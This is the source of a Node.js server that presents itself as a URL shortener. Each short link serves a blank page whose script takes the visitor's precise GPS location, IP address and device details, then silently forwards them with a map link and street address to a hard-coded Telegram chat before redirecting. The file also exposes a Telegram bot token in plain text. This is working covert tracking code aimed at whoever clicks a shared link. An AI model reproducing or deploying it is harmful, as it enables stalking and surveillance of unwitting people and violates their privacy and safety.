const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.text({ type: 'text/plain', limit: '10mb' }));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5942654805';
const BASE_URL = process.env.SHORT_DOMAIN || 'https://vvvvv-production-7945.up.railway.app';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendToTelegram(msg, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: msg,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        },
        { timeout: 10000 }
      );
      return true;
    } catch (err) {
      if (i < retries - 1) await new Promise(r => setTimeout(r, 300));
    }
  }
  return false;
}

async function reverseGeocode(lat, lng) {
  try {
    const res = await axios.get(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { timeout: 3000, headers: { 'User-Agent': 'LinkShortener/1.0' } }
    );
    if (res.data && res.data.address) {
      return res.data.display_name || 'Unknown Location';
    }
  } catch (e) {}
  return null;
}

function safeParseBody(req) {
  if (typeof req.body === 'string') {
    try { return JSON.parse(req.body); } catch (e) { return {}; }
  }
  return req.body || {};
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  let normalizedUrl = url.trim();
  if (!/^https?:\/\//i.test(normalizedUrl)) {
    normalizedUrl = 'https://' + normalizedUrl;
  }

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: normalizedUrl, created: new Date(), clicks: 0 };

  res.json({
    shortened: `${BASE_URL}/${shortCode}`,
    code: shortCode
  });
});

app.post('/api/log-gps', async (req, res) => {
  const body = safeParseBody(req);
  const { code, latitude, longitude, accuracy, deviceData } = body;

  if (!code || !linkStorage[code]) {
    return res.status(404).json({ error: 'Not found' });
  }

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
  linkStorage[code].clicks++;

  let address = null;
  if (latitude && longitude) {
    address = await reverseGeocode(latitude, longitude);
  }

  let msg = `🎯 <b>رابط فُتح!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
  msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
  msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
  msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n`;
  msg += `━━━━━━━━━━━━━━━━━━━\n\n`;

  if (latitude && longitude) {
    msg += `<b>✅ 📍 GPS (موقع دقيق)</b>\n`;
    msg += `📍 <code>${parseFloat(latitude).toFixed(6)}, ${parseFloat(longitude).toFixed(6)}</code>\n`;
    msg += `📏 دقة: ±${parseInt(accuracy)} متر\n`;
    msg += `🗺️ <a href="https://maps.google.com/?q=${latitude},${longitude}">اضغط للخريطة</a>\n`;
    
    if (address) {
      msg += `📮 ${address}\n`;
    }
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    msg += `<b>❌ GPS</b>\nالمستخدم رفض السماح بالموقع\n━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  if (deviceData) {
    msg += `<b>📱 بيانات الجهاز:</b>\n`;
    if (deviceData.battery) msg += `🔋 البطارية: ${deviceData.battery}%\n`;
    if (deviceData.deviceType) msg += `📱 نوع الجهاز: ${deviceData.deviceType}\n`;
    if (deviceData.networkName) msg += `📡 شبكة WiFi: ${deviceData.networkName}\n`;
    if (deviceData.screenRes) msg += `📺 دقة الشاشة: ${deviceData.screenRes}\n`;
    if (deviceData.browser) msg += `🌐 المتصفح: ${deviceData.browser}\n`;
    if (deviceData.os) msg += `🖥️ النظام: ${deviceData.os}\n`;
    if (deviceData.language) msg += `🗣️ اللغة: ${deviceData.language}\n`;
    if (deviceData.cores) msg += `⚙️ المعالجات: ${deviceData.cores}\n`;
  }

  await sendToTelegram(msg);
  res.json({ success: true });
});

app.get('/api/test', async (req, res) => {
  const ok = await sendToTelegram('🔗 اختبار ✅');
  res.json({ telegram: ok ? 'sent' : 'failed' });
});

app.use(express.static('.'));

app.get('/:code', (req, res) => {
  const { code } = req.params;

  if (!linkStorage[code]) {
    return res.status(404).send('<h1>Not found</h1>');
  }

  const originalUrl = linkStorage[code].original;

  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; padding: 0; background: #000; }
  </style>
</head>
<body>
  <script>
    const code = ${JSON.stringify(code)};
    const originalUrl = ${JSON.stringify(originalUrl)};
    const apiUrl = '${BASE_URL}/api/log-gps';

    function collectDeviceData() {
      const ua = navigator.userAgent;
      let browser = 'Unknown', os = 'Unknown', deviceType = 'Unknown';
      
      if (/chrome/i.test(ua) && !/edg/i.test(ua)) browser = 'Chrome';
      else if (/firefox/i.test(ua)) browser = 'Firefox';
      else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
      else if (/edg/i.test(ua)) browser = 'Edge';

      if (/android/i.test(ua)) { os = 'Android'; deviceType = 'Android'; }
      else if (/iphone|ipad/i.test(ua)) { os = 'iOS'; deviceType = 'iPhone/iPad'; }
      else if (/windows/i.test(ua)) { os = 'Windows'; deviceType = 'Windows PC'; }
      else if (/mac/i.test(ua)) { os = 'macOS'; deviceType = 'Mac'; }
      else if (/linux/i.test(ua)) { os = 'Linux'; deviceType = 'Linux'; }

      const data = {
        browser: browser,
        os: os,
        deviceType: deviceType,
        screenRes: window.screen.width + 'x' + window.screen.height,
        cores: navigator.hardwareConcurrency || 'Unknown',
        language: navigator.language
      };

      return data;
    }

    function send(lat, lng, acc) {
      const deviceData = collectDeviceData();
      const payload = {
        code: code,
        latitude: lat,
        longitude: lng,
        accuracy: acc,
        deviceData: deviceData
      };

      fetch(apiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      }).finally(() => {
        window.location.href = originalUrl;
      });
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => send(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
        () => send(null, null, null),
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    } else {
      send(null, null, null);
    }
  </script>
</body>
</html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});